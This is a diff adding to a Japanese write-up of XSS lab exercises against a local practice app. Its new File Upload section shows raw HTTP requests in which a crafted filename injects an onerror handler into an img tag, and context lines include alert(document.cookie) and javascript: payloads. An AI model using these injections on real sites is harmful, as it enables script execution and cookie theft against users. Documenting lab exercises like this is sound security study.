@@ -70,6 +70,8 @@ hogehoge`の代わりに`777;alert(document.cookie)`などを入力すれば発�
 </script>
 ```
 
+ただ、これはJavaScript内へのReflected XSSの気がするため、想定解なのか不明。
+
 ## HTML Attribute Manipulation
 入力欄に適当に`hoge`と入れてレスポンスを確認する。
 ```html
@@ -148,11 +150,67 @@ title=hogehoge&link=javascript%3Aalert%281%29
 
 なお、`"`は無害化されてしまうため、イベントハンドラを入れるのは無理そう。
 
+## File Upload
+画像ファイルをアップロードできる。
+```http
+POST /lab/xss/image-upload/index.php HTTP/1.1
+Host: localhost:1337
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGGBjpOPOUAqCkMJm
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 
 
+------WebKitFormBoundaryGGBjpOPOUAqCkMJm
+Content-Disposition: form-data; name="image"; filename="1x1.png"
+Content-Type: image/png
 
+�PNG
+------WebKitFormBoundaryGGBjpOPOUAqCkMJm
+Content-Disposition: form-data; name="submit"
 
+Upload
+------WebKitFormBoundaryGGBjpOPOUAqCkMJm--
+```
 
+レスポンスにはこんな感じで
+```html
+<div class="container-wrapper">
+<div class="row pt-5 mt-5 mb-3 d-flex justify-content-center">
+<div class="row col-md-4 text-center d-flex justify-content-center shadow-lg p-3 mb-5 rounded">
+<img src="uploads/1x1.png                            " style="width: 300px;margin-top: 8px;" class="rounded-circle" alt="" srcset="">
+<form action="#" method="post" enctype="multipart/form-data">
+ ```
+ 
+ 半角スペースが入っている意味は不明だが、ファイル名が`<img src="upload/"`の後ろに出ていることが分かる。
+
+ダブルクォーテーションで閉じることができるか試してみる。
+```http
+POST /lab/xss/image-upload/index.php HTTP/1.1
+Host: localhost:1337
+Content-Length: 312
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZ2hDGxPdrsacLlEu
+Connection: close
+
+------WebKitFormBoundaryZ2hDGxPdrsacLlEu
+Content-Disposition: form-data; name="image"; filename="\"onerror=\"alert(1)\".gif"
+Content-Type: image/gif
+
+GIF87aaaaaaaa
+------WebKitFormBoundaryZ2hDGxPdrsacLlEu
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryZ2hDGxPdrsacLlEu--
+```
+
+レスポンスで、src属性から外にイベントハンドラが追加されており、XSSが動作する。
+```html
+<div class="container-wrapper">
+<div class="row pt-5 mt-5 mb-3 d-flex justify-content-center">
+<div class="row col-md-4 text-center d-flex justify-content-center shadow-lg p-3 mb-5 rounded">
+<img src="uploads/"onerror="alert(1)".gif                            " style="width: 300px;margin-top: 8px;" class="rounded-circle" alt="" srcset="">
+<form action="#" method="post" enctype="multipart/form-data">
+<div class="">
+```
 
 
 
